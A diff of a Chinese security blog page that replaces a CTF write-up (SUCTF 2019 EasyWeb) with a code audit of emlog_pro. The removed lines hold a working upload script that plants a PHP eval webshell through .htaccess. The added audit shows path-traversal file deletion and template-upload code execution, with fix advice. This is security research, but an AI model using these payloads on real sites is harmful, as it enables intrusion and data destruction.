@@ -14,11 +14,14 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="知识点,异或绕过配合文件上传.算是比较综合的一道题,而且上传的文件的构造姿势还是需要学习一波.">
+  <meta name="description" content="web安全的本质最终还得回归到代码层面.
+本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.
+网上没有公开,假装是个0day(滑稽).分析的每个利用都在后台,还是挺鸡肋的,师傅们看个乐子就行.
+代码审计总结">
   <meta name="author" content="Noel">
   <meta name="keywords" content="">
   
-  <title>SUCTF2019EasyWeb - Noel&#39;s Blog</title>
+  <title>emlog_pro代码审计 - Noel&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +166,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="SUCTF2019EasyWeb">
+            <span class="h2" id="subtitle" title="emlog_pro代码审计">
               
             </span>
 
@@ -173,8 +176,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-09-03 06:19" pubdate>
-        2021年9月3日 早上
+      <time datetime="2022-01-11 23:59" pubdate>
+        2022年1月11日 晚上
       </time>
     </span>
   
@@ -185,7 +188,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      337 字
+      1.2k 字
     </span>
   
 
@@ -195,7 +198,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      12
        分钟
     </span>
   
@@ -233,28 +236,87 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SUCTF2019EasyWeb</h1>
+            <h1 style="display: none">emlog_pro代码审计</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：4 个月前
+                  本文最后更新于：1 分钟前
                 
               </p>
             
             <div class="markdown-body">
-              <p>知识点,异或绕过配合文件上传.算是比较综合的一道题,而且上传的文件的构造姿势还是需要学习一波.</p>
+              <p><em><strong>web安全的本质最终还得回归到代码层面.</strong></em></p>
+<p>本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.</p>
+<p>网上没有公开,假装是个0day(滑稽).分析的每个利用都在后台,还是挺鸡肋的,师傅们看个乐子就行.</p>
+<a href="/2021/11/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/" title="代码审计总结">代码审计总结</a>
+
 <span id="more"></span>
 
-<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb">[SUCTF 2019]EasyWeb</a></p>
-<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h2><p>贴出我写的垃圾脚本,使用格式为<code>python3 filename url</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><br>shell = <span class="hljs-string">b&#x27;GIF89a12&#x27;</span> + base64.b64encode(<span class="hljs-string">b&quot;&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;&quot;</span>)<br>htaccess = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337 </span><br><span class="hljs-string">AddType application/x-httpd-php .noel</span><br><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/&#123;0&#125;&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;upload&#x27;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_shell</span>():</span><br>	<span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.noel&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_htaccess</span>(<span class="hljs-params">shell_path</span>):</span><br>	<span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-built_in">bytes</span>(htaccess.<span class="hljs-built_in">format</span>(shell_path),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>),<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在发送shell.noel..&#x27;</span>)<br>	file = generate_shell()<br>	session = requests.session()<br>	res_1 = session.post(url=url,data=data,files=file)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;已经发送，状态码为<span class="hljs-subst">&#123;res_1.status_code&#125;</span>,返回内容为： <span class="hljs-subst">&#123;res_1.text&#125;</span>..&#x27;</span>)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在发送 .htaccess..&#x27;</span>)<br>	file = generate_htaccess(res_1.text)<br>	res_2 = session.post(url=url,data=data,files=file)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;已经发送，状态码为<span class="hljs-subst">&#123;res_2.status_code&#125;</span>,返回内容为： <span class="hljs-subst">&#123;res_2.text&#125;</span>..&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>
+<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">emlog_pro</span> v<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/images/2021-09-03-SUCTF2019EasyWeb/image-20210903062515156.png" srcset="/img/loading.gif" lazyload alt="image-20210903062515156"></p>
-<p><img src="/images/2021-09-03-SUCTF2019EasyWeb/image-20210903062548086.png" srcset="/img/loading.gif" lazyload alt="image-20210903062548086"></p>
-<p>上蚁剑</p>
-<p>我这么里没有出现啥禁用问题 直接到跟目录下找到flag</p>
-<p><img src="../images/2021-09-03-SUCTF2019EasyWeb/image-20210903062714683.png" srcset="/img/loading.gif" lazyload alt="image-20210903062714683"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1>
+
+
+<h1 id="0x02-任意文件删除"><a href="#0x02-任意文件删除" class="headerlink" title="0x02 任意文件删除"></a>0x02 任意文件删除</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>漏洞源码出现在<code>include/lib/function.base.php</code>的第<code>756</code>行:</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211126085306591.png" srcset="/img/loading.gif" lazyload alt="image-20211126085306591"></p>
+<p>全局搜索函数<code>emDeleteFile</code>,在<code>admin/template.php</code>下发现可利用调用,其中<code>TPLS_PATH</code>的值为框架中<code>content/templates</code>在当前主机上的绝对路径</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211126085554241.png" srcset="/img/loading.gif" lazyload alt="image-20211126085554241"></p>
+<p>可以看到用户传入的<code>$tplName</code>的值可以通过<code>$_GET[&#39;tpl&#39;]</code>进行控制,且只进行了一个简单的<code>addslashes()</code>的过滤.由于这里的变量<code>$tplName</code>并没有带入数据库操作,所以对我们的限制几乎没有.于是可以通过<code>../</code>实现目录穿越.不过在第<code>66</code>行还存在一个变量<code>$noce_tmplet</code>,根据第<code>68</code>行的提示,应该能判断变量<code>$nonce_templet$</code>的值为当前模板的名称.这里只要咱们上传一个新模板就能绕过了.</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录后台,随便上传一个模板</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211126090553763.png" srcset="/img/loading.gif" lazyload alt="image-20211126090553763"></p>
+<p>删除前相关目录结构:</p>
+<blockquote>
+<p>就是初次官方下载源码后搭建完成的目录结构,</p>
+</blockquote>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211126091235707.png" srcset="/img/loading.gif" lazyload alt="image-20211126091235707"></p>
+<p>点击删除模板,利用bp抓取数据包,修改url中的<code>tpl</code>的值,这里我构造的为<code>../../robots.txt</code>,及web根目录下的<code>robots.txt</code>文件,发送,可以看到根目录下的<code>robots.txt</code>已经被删除了.且模板文件<code>benning</code>也被删除</p>
+<blockquote>
+<p>注:删除的模板不能为当前使用模板</p>
+</blockquote>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211126091715984.png" srcset="/img/loading.gif" lazyload alt="image-20211126091715984"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211126091646085.png" srcset="/img/loading.gif" lazyload alt="image-20211126091646085"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211126091956303.png" srcset="/img/loading.gif" lazyload alt="image-20211126091956303"></p>
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20211126092155888.png" srcset="/img/loading.gif" lazyload alt="image-20211126092155888"></p>
+<h1 id="0x03-模板上传getshell"><a href="#0x03-模板上传getshell" class="headerlink" title="0x03 模板上传getshell"></a>0x03 模板上传getshell</h1><p>这个漏洞点采用了 功能定向分析审计出来的.</p>
+<h2 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h2><p>漏洞点位于<code>admin/template.php</code>的第<code>87</code>行的上传模块内.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130134946124.png" srcset="/img/loading.gif" lazyload alt="image-20211130134946124"></p>
+<p>第<code>88</code>行到<code>99</code>行对当前<code>token</code>的有效期以及上传文件的后缀名进行了判断,这里只要正常上传一个<code>.zip</code>的文件都不会出现错误,我们继续.</p>
+<p>在第<code>101</code>行遇到一个<code>emUnzip</code>函数,跟进,发现其函数体位于<code>include/lib/function.base.php</code>的第<code>663</code>行:</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130135815750.png" srcset="/img/loading.gif" lazyload alt="image-20211130135815750"></p>
+<p>配合注释,能够大概了解到这个函数的作用是将我们刚刚传入的<code>.zip</code>文件进行解压缩操作.继续跟着走,</p>
+<p>在第<code>675</code>行,判断压缩文件内是否存在<code>header.php</code>,如果不存在,则返回<code>-2</code>;若存在,则执行解压操作,</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130140036087.png" srcset="/img/loading.gif" lazyload alt="image-20211130140036087"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130140149115.png" srcset="/img/loading.gif" lazyload alt="image-20211130140149115"></p>
+<p>且解压的路径我们是能通过<code>admin/template.php</code>得到的.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130140347061.png" srcset="/img/loading.gif" lazyload alt="image-20211130140347061"></p>
+<p>可以发现这里只判断了上传的<code>.zip</code>文件内是否存在<code>header.php</code>,并没有对<code>header.php</code>的内容以即是否存在其他恶意文件进行检测.这里可以直接将🐎写在<code>header.php</code>内进行绕过.</p>
+<p>继续跟进,发现<code>emUnZip()</code>函数已经调用完成,随后就是一些重定向操作,不重要.这个漏洞也就分析完了</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130140450041.png" srcset="/img/loading.gif" lazyload alt="image-20211130140450041"></p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><em><strong>上传模板文件路径可以直接访问</strong></em></p>
+<p>创建一个内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    phpinfo();<br></code></pre></td></tr></table></figure>
+
+<p>的<code>header.php文件</code>,放在文件夹进行压缩</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130141253478.png" srcset="/img/loading.gif" lazyload alt="image-20211130141253478"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130141515801.png" srcset="/img/loading.gif" lazyload alt="image-20211130141515801"></p>
+<p>直接到后台进行上传,可以看到后台模板直接多了一个名叫<code>exp</code>的模板,说明我们上传成功</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130141622989.png" srcset="/img/loading.gif" lazyload alt="image-20211130141622989"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130141636357.png" srcset="/img/loading.gif" lazyload alt="image-20211130141636357"></p>
+<p>访问<code>../content/tempaltes/exp/header.php</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130141852673.png" srcset="/img/loading.gif" lazyload alt="image-20211130141852673"></p>
+<p>可以看到成功执行<code>phpinfo()</code></p>
+<p><em><strong>上传模板路径没法直接访问</strong></em></p>
+<p>还有一种情况是我们没法直接读取模板路径下文件,这种情况比较常见.由于我们上传的文件时模板文件,加载的时候肯定会进行相关渲染,所以我们只需要让程序加载我们刚刚上传的模板代码就行.</p>
+<p>直接在模板外观文件处切换模块为我们刚刚上传的exp</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130143627876.png" srcset="/img/loading.gif" lazyload alt="image-20211130143627876"></p>
+<p>访问web主页面</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211130143657594.png" srcset="/img/loading.gif" lazyload alt="image-20211130143657594"></p>
+<p>可以看到同样执行了代码，且不需要访问模板文件目录.</p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>测试官网最新发布的<code>emlog_pro_1.1.0.zip</code>同样存在以上两个漏洞,且利用方式相同.</p>
+<p>修复建议:</p>
+<p>针对任意文件删除：过滤<code>$_GET[&#39;tpl&#39;]</code>中的<code>.</code>和<code>/</code>字符,防止造成目录穿越</p>
+<p>针对模板文件上传getshell：增加对模板文件内容的检查，防止恶意代码注入.</p>
+<p>这个cms的审计分析特别简单，有手就行了。此外，在模板上传getshell处，使用了<code>根据功能点定向审计</code>的方法，黑白结合，对此方法有了进一步感受。</p>
+
             </div>
             <hr>
             <div>
@@ -263,7 +325,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                     
                   </div>
                 
@@ -271,9 +333,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/php/">php</a>
-                    
-                      <a class="hover-with-bg" href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
+                      <a class="hover-with-bg" href="/tags/cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">cms代码审计</a>
                     
                   </div>
                 
@@ -290,18 +350,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/09/23/tianyibei/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ezeval</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/09/02/Upload-Summary/">
-                        <span class="hidden-mobile">Upload_Summary</span>
+                      <a href="/2022/01/11/redteam_2/">
+                        <span class="hidden-mobile">redteam_2</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
